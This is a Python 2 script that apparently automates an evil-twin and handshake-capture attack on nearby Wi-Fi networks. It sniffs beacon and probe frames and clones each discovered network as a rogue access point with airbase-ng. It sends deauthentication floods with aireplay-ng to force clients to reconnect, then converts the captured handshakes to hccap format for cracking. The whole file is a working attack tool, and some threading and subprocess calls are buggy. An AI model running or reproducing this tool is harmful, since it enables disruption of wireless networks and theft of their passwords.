import subprocess
from time import sleep
import threading
from binascii import unhexlify, hexlify
import argparse

cache = []


def start_AP(essid, bssid, interface, path, channel):
    try:
        import subprocess
        print channel
        subprocess.check_call(["airmon-ng", "start", interface + "mon", channel])
        
        kill = lambda process: process.terminate()
        import os
        os.chdir(path + "/logs/")
        if bssid == b"\xff\xff\xff\xff\xff\xff":
            cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", interface + "mon"])
        else:
            cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", interface+"mon"])           
        timer = threading.Timer(10, kill, [cmd])
        try:
            timer.start()
            if (bssid) != b"\xff\xff\xff\xff\xff\xff":
                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "5", interface+"mon"])
            stdout, stderr = cmd.communicate()
        finally:
            timer.cancel()
            subprocess.check_call(["airmon-ng", "check", interface + "mon", channel])
            subprocess.call(["python", path + "/converter_p.2.7.py", essid + "_log-01.cap", "hccap"])

    except Exception, e:
       print e


def monitor(dump, interface, path):
    packet_index = -1
    error_index = 0
    print "\n" + dump + " file is being investigated\n"
    try:
        while True:
            try:
                f = open(path + "/dumps/" + dump, 'rb')
                from pcapParser import load_savefile
                caps, header = load_savefile(f)
                packets = caps.packets
                # ------------------------------
                from time import time
                start = time()*1000
                # ------------------------------
                while time()*1000 - start <= 10:
                    packet_index += 1
                    print str(packet_index) + "     " + str(time()*1000 - start) + "start " + str(start)
                    if unhexlify(packets[packet_index][1].packet)[0] == b'\x80':    # if the packet is really a beacon
                        essid_len = int(unhexlify(packets[packet_index][1].packet)[37].encode("hex"), 16)
                        # ---------
                        if essid_len != 0:
                            current_essid = (unhexlify(packets[packet_index][1].packet)[38: 38 + essid_len]).encode("ascii")
                            if (unhexlify(packets[packet_index][1].packet)[38: 38 + essid_len]) != b'\xff\xff\xff\xff\xff\xff' and not(current_essid in cache):  # if we've already seen this ESSID before
                                print "in "  + str(packet_index + 1) + " ESSID " + current_essid + " found"
                                cache.append(current_essid)
                                # ------
                                from threading import Thread
                                bssid = unhexlify((packets[packet_index][1].packet))[16: 22]
                                rates_len = int(unhexlify(packets[packet_index][1].packet)[38 + essid_len + 1].encode("hex"), 16)
                                print "rates_len of essid " + current_essid + " is " + str(rates_len)
                                channel = int(unhexlify((packets[packet_index][1].packet))[38 + essid_len + 1 + rates_len + 1 + 1 + 1].encode("hex"), 16)
                                print "channel of essid " + current_essid + " is " + str(channel)
                                #print "\nBSSID: " + str(bssid) + " " + hexlify(bssid) + " of length " + str(len(bssid)) + "\n"
                                task_AP = Thread(start_AP(current_essid, bssid, interface, path, str(channel)))
                                task_AP.start()
                        # ---------
                    
                    elif unhexlify(packets[packet_index][1].packet)[0] == b'\x40':  # or if the packet is really a probe
                        essid_len = int(unhexlify(packets[packet_index][1].packet)[25].encode("hex"), 16)
                        # ---------
                        if essid_len != 0:
                            current_essid = (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]).encode("ascii")
                            if (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]) != b'\xff\xff\xff\xff\xff\xff' and not(current_essid in cache):  # if we've already seen this ESSID before
                                print "in "  + str(packet_index + 1) + " ESSID " + current_essid + " found"
                                cache.append(current_essid)
                                # ------
                                from threading import Thread
                                task_AP = Thread(start_AP(current_essid, b"\xff\xff\xff\xff\xff\xff", interface, path, str(1)))
                                task_AP.start()
                        # ---------
                    

                # ------------------------------
                f.close()

            except IOError:
                print "File is not ready yet...\n"
                sleep(1)
                # --------
                if error_index == 15:
                    print "\nWaited too long, trying to scan the next file\n"
                    return 0
                # --------
                error_index += 1

            except IndexError:
                print "Scan is done\n"
                break

            except Exception,e:
                t = 10

    except KeyboardInterrupt:
        exit(1)


def start_sniff(interface, path):
    import os
    os.chdir(path + "/logs/")
    # -------------------------------------
    i = 1
    while True:
        if i < 10:
            dump = "beac_dump-0" + str(i) + ".cap"
        else:
            dump = "beac_dump-" + str(i) + ".cap"

        monitor(dump, interface, path)
        i += 1


def timeout(p):
	p.kill()


def f1():
	from time import sleep
	p = subprocess.call(["airodump-ng", "wlan0mon", "--beacons", "--write", "beac_dump"], timeout = 5)
	sleep(5)
	p.terminate()


def f2():
	subprocess.call(["python", "sniff_n_create.py", "beac_dump-01.cap"])


def start_mon(interface, path):
    import os
    os.chdir(path + "/dumps/")
    print os.getcwd() + " mon"
    i = 0
    from random import randint
    subprocess.call(["airmon-ng", "start", interface, str(randint(1, 14))])
    try:
    	while i <= 9:
    		os.chdir(path + "/dumps/")
    		kill = lambda process: process.terminate()
    		cmd = subprocess.Popen(["airodump-ng", interface+"mon", "--beacons", "--write", "beac_dump"])
    		timer = threading.Timer(10, kill, [cmd])
    		try:
    			timer.start()
    			stdout, stderr = cmd.communicate()
    		finally:
    			timer.cancel()
    		i += 1

    except KeyboardInterrupt:
    	exit(1)


def createParser ():
    parser = argparse.ArgumentParser()
    parser.add_argument ('-s', '--send', type=str, default = '', help='name of the interface that is to be used for listening')
    parser.add_argument ('-l', '--listen', type=str, default = '', help = 'name of the interface that is going to be used for creating AP and for sending deauth packets')
    return parser


if __name__ == "__main__":
    import sys
    parser = createParser()
    namespace = parser.parse_args(sys.argv[1:])
 
    if namespace.send == '' or namespace.listen == '':
        print '\ninvalid input params\n'
        exit(1)

    try:
        try:
        	subprocess.call(["mkdir", "dumps"])
        	subprocess.call(["mkdir", "logs"])

        except Exception,e:
            print str(e)
    	# ----------------------
        import os
    	cwd = os.getcwd()
        task1 = threading.Thread(target = start_mon, args=(namespace.send, cwd))
        task2 = threading.Thread(target = start_sniff, args=(namespace.listen, cwd))
        task1.start()
        task2.start()

    except Exception,e:
            print str(e)

'''if __name__ == "__main__":
	from sys import argv, exit
	import getopt

	try:
		opts,args = getopt.getopt(argv, "h:")
		for opt in args:
			if opt == "-h":
				print "the correct format is:\n-----------------------------------------\n\tpython listen.py [opt arg]\n\nlist of available options:\n\t-i <- \n\t-o <- \n\t-----------------------------------------"

	except getopt.GetoptError:
		t = 1
	try:
		task1 = threading.Thread(target = start_mon)
		task2 = threading.Thread(target = start_sniff)
		task1.start()
		task2.start()

	except Exception,e:
			print str(e)'''